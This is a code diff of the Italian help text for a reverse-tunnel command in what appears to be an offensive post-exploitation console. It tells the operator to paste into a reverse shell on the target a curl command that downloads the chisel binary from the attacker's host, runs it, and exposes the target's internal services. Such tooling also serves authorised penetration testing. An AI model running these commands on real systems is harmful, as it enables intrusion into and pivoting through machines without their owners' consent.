@@ -1658,15 +1658,21 @@ def _tunnel_help() -> None:
 Crea un tunnel reverse per accedere a servizi interni del target
 (webapp su localhost, admin panel, ecc.) direttamente nel tuo browser.
 
+## Requisiti
+
+- **chisel** deve essere in `static/` — usa `tunnel fetch` per scaricarlo
+- Il **serve** deve essere attivo (`serve on`) per servire il binario al target
+- Il target deve poter raggiungere LHOST sulla porta del chisel server (default 8443)
+
 ## Comandi
 
 | Comando | Descrizione |
 |---------|-------------|
+| `tunnel fetch [--force]` | Scarica chisel in `static/` |
 | `tunnel on <porta>` | Avvia tunnel per la porta remota specificata |
 | `tunnel off` | Chiudi chisel server e tutti i tunnel |
 | `tunnel status` | Mostra stato del server e tunnel attivi |
 | `tunnel list` | Elenca i tunnel attivi |
-| `tunnel fetch [--force]` | Scarica chisel in `static/` |
 | `tunnel help` | Mostra questo aiuto |
 
 ## Opzioni
@@ -1679,25 +1685,23 @@ Crea un tunnel reverse per accedere a servizi interni del target
 ## Esempio tipico
 
 ```bash
-# 1. In SLConsole — avvia tunnel per la porta 80 del target
+# 1. Scarica chisel (solo la prima volta)
+slconsole> tunnel fetch
+
+# 2. Avvia tunnel per la porta 80 del target
 slconsole> tunnel on 80
 
-# 2. Copia il comando mostrato e incollalo nella revshell
+# 3. Copia il comando mostrato e incollalo nella revshell
 curl http://LHOST:2727/static/chisel -o /tmp/chisel && \
   chmod +x /tmp/chisel && \
   /tmp/chisel client LHOST:8443 R:9000:127.0.0.1:80 &
 
-# 3. Apri nel browser
+# 4. Apri nel browser
 http://localhost:9000
 
-# 4. Tunnel multipli — ogni volta con porta locale diversa
+# 5. Tunnel multipli — ogni volta con porta locale diversa
 slconsole> tunnel on 8080 --local-port 9001
 ```
-
-## Requisiti
-
-- **chisel** deve essere in `static/` — usa `tunnel fetch` per scaricarlo
-- Il target deve poter raggiungere LHOST sulla porta del chisel server (8443)
 """)
 
 
